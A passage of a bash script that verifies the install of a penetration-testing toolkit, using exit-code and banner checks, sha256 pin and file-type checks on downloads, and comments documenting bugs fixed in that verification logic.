#   no pattern -> the command must exit 0.
#   pattern    -> exit status is IGNORED and the OUTPUT must match /pattern/i.
#                 Needed because many tools print their banner then exit non-zero
#                 (hydra -h, proxychains4 -h, responder -h).
# Wrapped in 'timeout' so one hanging tool cannot stall the whole run.
_run_check() {
    local desc=$1 cmd=$2 pat=${3:-} out rc
    out=$(timeout 180 bash -c "$cmd" 2>&1); rc=$?
    if [ "$rc" -eq 124 ]; then
        print_warning "$desc TIMED OUT during verification"
        WARN=$((WARN+1)); return 0
    fi
    if [ -n "$pat" ]; then
        if printf '%s' "$out" | grep -qaiE "$pat"; then
            print_success "$desc verified"; PASS=$((PASS+1))
        else
            print_warning "$desc ran but its output did not match /$pat/ - suspect"
            WARN=$((WARN+1))
        fi
        return 0
    fi
    if [ "$rc" -eq 0 ]; then
        print_success "$desc verified"; PASS=$((PASS+1))
    else
        print_warning "$desc is installed but FAILED to run (exit $rc)"
        WARN=$((WARN+1))
    fi
    return 0
}

# check_tool <name> [command] [pattern] - PATH lookup first, then run it.
check_tool() {
    local tool=$1
    if ! command -v "$tool" &>/dev/null; then
        print_error "$tool NOT installed"
        FAIL=$((FAIL+1)); return 0
    fi
    _run_check "$tool" "${2:-$tool --version}" "${3:-}"
}

# check_cmd <desc> <command> [pattern] - for things not on PATH (repo checkouts
# invoked through their interpreter).
check_cmd() { _run_check "$1" "$2" "${3:-}"; }

# check_file - existence only. Correct for DIRECTORIES; do not use it for files
# we downloaded (see check_payload).
check_file() {
    local file=$1 desc=$2
    if [ -e "$file" ]; then
        print_success "$desc verified"; PASS=$((PASS+1))
    else
        print_error "$desc NOT found"; FAIL=$((FAIL+1))
    fi
}

# check_payload <path> <desc> <pattern> [min-bytes] [pin-name] - for DOWNLOADED files.
# 'curl -f' catches a 404, but a proxy or captive-portal interception page answers
# 200 and lands on disk as a perfectly successful download. So: check the size,
# then sniff the first 2 KB for what the file should actually contain. This is the
# check that catches "linpeas.sh is 1.4 KB of HTML".
#
# TWO BUGS FOUND BY THE FIRST REAL all.sh RUN, both of which made this function
# report a FAIL on a file that was perfectly fine. A verification pass that cries
# wolf on the single biggest download in the build teaches people to ignore it,
# so these matter more than the count of 4 failures suggests.
#
# 1. `stat -c %s` DOES NOT FOLLOW SYMLINKS. GNU stat uses lstat() by default, so
#    on a symlink it returns the length of the TARGET PATH STRING, not the file.
#    /opt/burpsuite/burpsuite.jar is a symlink that install_burp_latest points at
#    the versioned jar, and the run reported:
#        "Burp jar is only 48 bytes (expected >= 100000000)"
#    48 is exactly strlen("/opt/burpsuite/burpsuite_community_v2026.3.3.jar").
#    Burp was installed, 650 MB of it, and the very next check confirmed it RUNS.
#    `stat -Lc` dereferences, which is what was meant all along.
#
# 2. A sha256 PIN IS STRONGER PROOF THAN ANY CONTENT SNIFF, so when we have one,
#    use it and skip the sniff. The sniff exists to catch an HTTP 200 that is
#    really an error page - something that cannot possibly match a pinned hash.
#    PrivescCheck.ps1 failed /function|param/ because itm4n's RELEASE build is a
#    single packed base64 blob (`$Verbalizes = "S1mDh0YWn46..."`), so the first
#    2 KB contain neither word. Its sha256 matched the pin exactly, both at
#    download time and when re-checked by hand. Guessing at the first 2 KB of
#    somebody else's release artifact is inherently brittle; a hash is not.
check_payload() {
    local f=$1 desc=$2 pat=$3 minb=${4:-1024} pin=${5:-} sz got want
    if [ ! -f "$f" ]; then
        print_error "$desc NOT found"; FAIL=$((FAIL+1)); return 0
    fi
    sz=$(stat -Lc %s "$f" 2>/dev/null || echo 0)
    if [ "$sz" -lt "$minb" ]; then
        print_error "$desc is only ${sz} bytes (expected >= ${minb}) - truncated or an error page"
        FAIL=$((FAIL+1)); return 0
    fi
    if [ -n "$pin" ]; then
        want=${PIN_SHA[$pin]:-TBD}
        if [ "$want" != "TBD" ]; then
            got=$(sha256sum "$f" 2>/dev/null | cut -d' ' -f1)
            if [ "$got" = "$want" ]; then
                print_success "$desc verified by pinned sha256 (${sz} bytes)"
                PASS=$((PASS+1)); return 0
            fi
            print_error "$desc does NOT match its pinned sha256"
            print_error "  expected ${want:0:16}...  got ${got:0:16}...  ($f)"
            FAIL=$((FAIL+1)); return 0
        fi
    fi
    if head -c 2048 "$f" | grep -qaiE "$pat"; then
        print_success "$desc verified (${sz} bytes)"; PASS=$((PASS+1))
    else
        print_error "$desc is the wrong KIND of file - first bytes do not match /$pat/ (HTML error page?)"
        FAIL=$((FAIL+1))
    fi
    return 0
}

# check_script <path> <desc> - a downloaded shell script that PARSES is a far
# stronger signal than one that merely exists.
check_script() {
    local f=$1 desc=$2
    if [ ! -f "$f" ]; then
        print_error "$desc NOT found"; FAIL=$((FAIL+1)); return 0
    fi
    if bash -n "$f" 2>/dev/null; then
        print_success "$desc verified (parses as shell)"; PASS=$((PASS+1))
    else
        print_error "$desc exists but is NOT valid shell - bad download"; FAIL=$((FAIL+1))
    fi
    return 0
}

# check_repo <dir> <desc> - a clone that exists but is EMPTY (interrupted clone)
# used to pass a plain existence check.
check_repo() {
    local dir=$1 desc=$2 n
    if [ ! -d "$dir" ]; then
        print_error "$desc NOT found"; FAIL=$((FAIL+1)); return 0
    fi
    n=$(find "$dir" -type f 2>/dev/null | wc -l)
    if [ "$n" -lt 2 ]; then
        print_error "$desc is present but nearly empty ($n files) - interrupted clone"
        FAIL=$((FAIL+1))
    else
        print_success "$desc verified ($n files)"; PASS=$((PASS+1))
    fi
    return 0
}

# check_pe <file> <desc> - a Windows payload must be a real PE. Everything in the
# payload set arrives over HTTP, so the failure that matters is a captive portal
# returning an HTML page with a 200 status. A PE starts "MZ".
check_pe() {
    local f=$1 desc=$2
    if [ ! -s "$f" ]; then
        print_error "$desc NOT found"; FAIL=$((FAIL+1)); return 0
    fi
    if head -c 2 "$f" | grep -qa "^MZ"; then
        print_success "$desc verified (valid PE)"; PASS=$((PASS+1))
    else
        print_error "$desc is NOT a PE - captive portal or failed download?"
        FAIL=$((FAIL+1))
    fi
    return 0
}

# check_ps1 <file> <desc> - reject HTML masquerading as a PowerShell script.
check_ps1() {
    local f=$1 desc=$2
    if [ ! -s "$f" ]; then
        print_error "$desc NOT found"; FAIL=$((FAIL+1)); return 0
    fi
    if head -c 512 "$f" | grep -qaiE '<!doctype|<html'; then
        print_error "$desc is HTML, not PowerShell - captive portal?"; FAIL=$((FAIL+1))
    else
        print_success "$desc verified"; PASS=$((PASS+1))
    fi
    return 0
}

# $1 = python module name, $2 = human label
check_pymod() {
    if python3 -c "import $1" &>/dev/null; then
        print_success "$2 verified"; PASS=$((PASS+1))
    else
        print_error "$2 NOT working"; FAIL=$((FAIL+1))
    fi
}

# Print the pin/verification summary. Callers run this next to the APT summary.
pin_summary() {
    echo
    if [ ${#HASH_MISMATCH[@]} -gt 0 ]; then
        print_error "SHA256 MISMATCH on: ${HASH_MISMATCH[*]}"
        print_error "  Treat these as untrusted until explained."
    fi
    if [ ${#UNPINNED[@]} -gt 0 ]; then
        print_warning "${#UNPINNED[@]} artifact(s) fetched without a version pin:"
        print_warning "  ${UNPINNED[*]}"
        print_warning "  Two operators can get different builds. Pin them: bash pins.sh --record"
    fi
    # The all-clear is gated on BOTH lists. It used to check UNPINNED only, so a
    # run with a hash mismatch and nothing unpinned printed the mismatch error and
    # then "Every downloaded artifact was verified" on the very next line - in the
    # summary an operator reads after a 30-minute build, which is exactly where a
    # contradiction gets resolved in favour of the reassuring half.
    if [ ${#UNPINNED[@]} -eq 0 ] && [ ${#HASH_MISMATCH[@]} -eq 0 ]; then
        print_success "Every downloaded artifact was version-pinned and hash-verified."
    fi
    [ -f "$PINS_LOCK" ] && print_status "What this box actually got: $PINS_LOCK"
    print_status "Audit this box against the manifest any time: bash pins.sh --audit"
    return 0
}
